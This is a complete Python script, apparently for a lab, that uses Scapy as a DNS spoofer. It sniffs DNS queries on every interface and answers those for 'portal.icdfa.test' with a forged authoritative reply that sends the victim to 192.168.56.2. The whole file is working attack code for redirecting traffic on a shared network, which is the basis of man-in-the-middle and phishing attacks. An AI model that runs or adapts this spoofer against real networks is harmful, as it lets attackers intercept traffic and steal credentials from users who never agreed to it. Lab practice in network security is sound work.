#!/usr/bin/env python3
"""DNS Spoofer using raw Scapy (no netfilterqueue needed)"""
from scapy.all import *

SPOOF_DOMAIN = b"portal.icdfa.test"
SPOOF_IP = "192.168.56.2"

def handle(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
        return
    if pkt[DNS].qr != 0:
        return
    try:
        qname = bytes(pkt[DNSQR].qname)
    except Exception:
        return
    print(f"[dns-spoof] Sniffed: {qname.decode(errors='replace')} from {pkt[IP].src}")
    if SPOOF_DOMAIN in qname:
        reply = (
            IP(src=pkt[IP].dst, dst=pkt[IP].src) /
            UDP(sport=53, dport=pkt[UDP].sport) /
            DNS(id=pkt[DNS].id, qr=1, aa=1, rd=1, ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=SPOOF_IP))
        )
        send(reply, verbose=False)
        print(f"[dns-spoof] Sent forged response: {SPOOF_IP}")

print("[dns-spoof] Listening for DNS queries on all interfaces...")
sniff(filter="udp port 53", prn=handle, store=False)
